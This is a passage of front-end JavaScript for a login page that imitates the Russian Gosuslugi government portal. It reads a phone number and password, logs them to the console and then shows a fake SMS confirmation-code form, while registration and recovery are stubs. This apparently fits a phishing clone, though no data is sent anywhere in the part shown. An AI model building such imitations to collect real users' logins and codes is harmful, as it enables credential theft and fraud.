		var inputLoginPole = document.querySelector('#login');
		var inputPassPole = document.querySelector('#password');
		var inputTextLink = document.querySelector('#resText');
		var inputRusTagLink = document.querySelector('#rusTag');
		var inputFooterLink = document.querySelector('#logFooterText');
		var inputRestoreLink = document.querySelector('#restoreInform');
		var inputRegLink = document.querySelector('#regUpButton');
		var inputSignButtLink = document.querySelector('#signInButt');
		var inputBackButtLink = document.querySelector('#backForm');
		if(inputLoginPole){
			inputLoginPole.addEventListener(typeTap, (e) => selectInputPole(e));
		}
		if(inputPassPole){
			inputPassPole.addEventListener(typeTap, (e) => selectInputPole(e));
		}
		if(inputRusTagLink){
			inputRusTagLink.addEventListener(typeTap, (e) => {funcOpenPage()});
		}
		if(inputTextLink){
			inputTextLink.addEventListener(typeTap, (e) => {funcOpenPage()});
		}
		if(inputFooterLink){
			inputFooterLink.addEventListener(typeTap, (e) => {funcOpenPage()});
		}
		if(inputRestoreLink){
			inputRestoreLink.addEventListener(typeTap, (e) => {funcOpenPage()});
		}
		if(inputRegLink){
			inputRegLink.addEventListener(typeTap, (e) => {funcOpenPage()});
		}
		if(inputSignButtLink){
			inputSignButtLink.addEventListener(typeTap, () => {authorisation(inputLoginPole,inputPassPole)});
		}
		if(inputBackButtLink){
			inputBackButtLink.addEventListener(typeTap, () => {backToTitulPage()});
		}		
	}
	function backToTitulPage(){//функция возврата на титульную страницу
		var pageNow = document.querySelector("#realLogin");//форму которую надо задвинуть вправо
		removeCSS("login.css");
		pageNow.innerHTML = "";			
		setTimeout(function tick(){ 
			pageNow.remove(); 
			window.location.replace('./index.html');
		}, 100);		
	}
	function authorisation(e,k){//авторизация
		if(e.value != '' && k.value != ''){
			console.log(e.value + " | "+ k.value);
			var loginFormPlace = document.querySelector("#mainPlace");
			loginFormPlace.insertAdjacentHTML("beforeend", fourthForm);
			document.querySelector("#trustTitul").insertAdjacentText("beforeend", "по смс");
			document.querySelector("#messTrust").insertAdjacentText("beforeend", "Код подтверждения отправлен на номер");
			document.querySelector("#telTrust").textContent = e.value; //+7 951 ***-**-15
		}else{
			console.log("незаполнены поля");
			aMessages("Ошибка!","Не заполнены одно или оба обязательных поля. Повторите попытку еще раз.",2);
		}
	}
	function loadRegForm(){//выскакивающий подвал пререгистрации
		var regPreFormPlace = document.querySelector("#mainPlace");
		regPreFormPlace.insertAdjacentHTML("beforeend", "<div id='preRegBack'><div id='preRegForm'><div class='preRegPodForm'><div class=''><div id='regLine'></div></div><div class='stroka fl sb'><div id='preRegTitul'>Регистрация на Госуслугах</div><div id=''><a id='closePreRegForm'>закрыть</a></div></div><div class='stroka'><div class='parf'>Если у вас есть учётная запись, попробуйте восстановить доступ к ней</div></div><div class='stroka'><div class='parf'>Если у вас не было учётной записи, продолжите регистрацию</div></div><div><div><button id='signUpTop'>Продолжить регистрацию</button></div><div><button id='restLogin'>Восстановить доступ</button></div></div></div></div></div>");
		var regPreFormInfo = document.querySelector("#preRegForm");
		animShow("transitUp", 100, regPreFormInfo, 0);
		
		var closePreRegForm = document.querySelector("#closePreRegForm");
		var signUpTop = document.querySelector("#signUpTop");
		var restLogin = document.querySelector("#restLogin");
		
		signUpTop.addEventListener(typeTap, (e)=>{functionZero(regPreFormInfo);});
		restLogin.addEventListener(typeTap, (e)=>{functionZero(regPreFormInfo);});
		closePreRegForm.addEventListener(typeTap, (e)=>{closeFormReg(regPreFormInfo);});
	}	
	function signUpTop(e){//регистрация		
	}
	function restLogin(e){//восстановление доступа
	}
	function functionZero(e){//заглушка для подвала пререгистрации
		var closeForm = document.querySelector("#preRegBack");
		animHide("transitDown", 100, e);		
		aMessages("Функция временно недоступна","Портал работает в прежднем режиме. Повторите попытку позже.",2);
		setTimeout(function tick(){ closeForm.remove(); }, 450);
	}
	function selectInputPole(e){//выделение input на логин странице
		var statusInput = e.target.classList.contains("-actv");
		if(statusInput == false){
			var predActiveElem = document.querySelector(".-actv");
			if(predActiveElem){
				var spuffElem = predActiveElem.parentElement.querySelector(".headInput");
				var spuffText = spuffElem.textContent;
				predActiveElem.classList.remove("-actv");
				spuffElem.style.display = 'none';
				predActiveElem.setAttribute("placeholder", spuffText);				
			}
			e.target.classList.add("-actv");
			e.target.setAttribute("placeholder", "");
			var layerInput = e.target.parentElement.querySelector(".headInput");
			layerInput.style.display = 'block';
			var activAtr = e.target.getAttribute("type");
			if(activAtr == "password" || (activAtr == "text" && e.target.id == "password")){				
				e.target.parentElement.insertAdjacentHTML("beforeend", "<div class='hidePasData'><img src='./img/eyeHid.png' id='changeVision' status='hide'></div>");				
				changeVisionPass();
				var telDataInput = document.querySelector("#login");
				if(telDataInput.value.length == 2){
					telDataInput.value = "";
				}
			}else{
				var dataToRemove = document.querySelector(".hidePasData");
				if(dataToRemove){
					dataToRemove.remove();
				}
				var poleNow = e.target;
				telManipulation(e.target);
			}			
		}		
	}
	function telManipulation(e){//манипуляции с вводом телефона
		if(e.value == null || e.value == ""){
			e.value = "+7";
		}		
		e.onkeydown = function(evt){
		  const t = evt.target;
		  if(evt.keyCode === 8){//backspace
			if(e.value.length == 2 || e.value[e.selectionStart-2] == "+"){
				evt.preventDefault();
			}
		  }else if(evt.keyCode === 46){//delete
			if(e.value.length == 2){
				evt.preventDefault();
			}
		  }
		};
		e.addEventListener("keyup", (k) => {
			if(k.key == "8" && e.value.length == 3){
				e.value = "+7";
			}
		});
	}
	function changeVisionPass(){//изменение отображения пароля в input
		var changeVisionPassword = document.querySelector("#changeVision");					
		changeVisionPassword.addEventListener(typeTap, (e)=>{
			e.preventDefault();
			var passwordPole = document.querySelector("#password");
			var passwordPoleType = passwordPole.getAttribute("type");
			switch(passwordPoleType){
				case "password":
					passwordPole.setAttribute("type", "text");
					changeVisionPassword.setAttribute("src","./img/eyeVis.png");
					break;
				case "text":
					passwordPole.setAttribute("type", "password");
					changeVisionPassword.setAttribute("src","./img/eyeHid.png");
					break;					
			}
		});
	}
	function closeFormReg(e){//скрытие выскакивающего подвала
		var closeForm = document.querySelector("#preRegBack");
		animHide("transitDown", 100, e);		
		setTimeout(function tick(){ closeForm.remove(); }, 450);
	}
	function loadCSS(href){//подгрузка стиля на страницу
		const link = document.createElement('link');
		link.rel = 'stylesheet';
		link.href = href;
		document.head.appendChild(link);
	}
	function removeCSS(href){//удаление стиля подгруженного на страницу
		const links = document.querySelectorAll('link[rel="stylesheet"]');
		links.forEach(link => {
			if (link.href.includes(href)){
				document.head.removeChild(link);
			}
		});
	}
	function animShow(type, duration, object, margin){//анимация появления
		var type;
		var duration;
		var object;
		var margin;
		
		switch(type){
			case "transitLeft":				
				var maxCord = window.innerWidth; //получаем ширину окна это максимум
				var tekCord = object.getBoundingClientRect().left + document.body.scrollLeft;
				var minCord = margin;
				setTimeout(function tick(){				
					object.style.left = minCord+"px";
				}, duration);				
				break;
			case "transitUp":
				var maxCord = window.innerHeight;
				var tekCord = object.getBoundingClientRect().bottom;
				var minCord = margin;
				setTimeout(function tick(){				
					object.style.bottom = minCord+"px";
				}, duration);
				break;
			case "progressBar":				
				var maxCord = window.innerWidth;
				var tekCord = object.getBoundingClientRect().width;
				var minCord = margin;
				setTimeout(function tick(){				
					object.style.width = minCord+"%";
				}, duration);
				setTimeout(function tick(){				
					object.style.width = minCord+10+"%";					
				}, 1000);
				setTimeout(() => {object.remove();}, 1000);
				break;
		}
	}
	function animHide(type, duration, object){//анимация скрытия
		var type;
		var duration;
		var object;
		
		switch(type){
			case "transitRight":
				var maxCord = window.innerWidth; //получаем ширину окна это максимум
				var tekCord = object.getBoundingClientRect().left + document.body.scrollLeft; //
				setTimeout(function tick(){				
					object.style.left = "100%";
				}, duration);				
				break;
			case "transitDown":
				var tekCord = object.getBoundingClientRect().bottom; //
				setTimeout(function tick(){				
					object.style.bottom = "-300px";
				}, duration);
				break;			
		}
	}
	function aMessages(aMtitle,aMbody,aMtimer){//системные уведомления, ошибки
		var aMessageForm = document.querySelector("#sysMess");
		if(!aMessageForm){
			if(aMtimer != 0){
				document.body.insertAdjacentHTML('afterbegin',`<div id='sysMess' class='fl cc'><div id='sysMessForm'><div id='sysMessTitul' class='stroka'>${aMtitle}</div><div id='sysMessText' class='stroka'>${aMbody}</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div>`);
				aMtimer = aMtimer*1000;
				setTimeout(() => {document.querySelector('#sysMess').remove();}, aMtimer);	
			}else{
				document.body.insertAdjacentHTML('afterbegin',`<div id='sysMess' class='fl cc'><div id='sysMessForm'><div id='sysMessTitul' class='stroka'>${aMtitle}</div><div id='sysMessText' class='stroka'>${aMbody}</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div>`);
			}
		}
	}

    loadingSpace();
}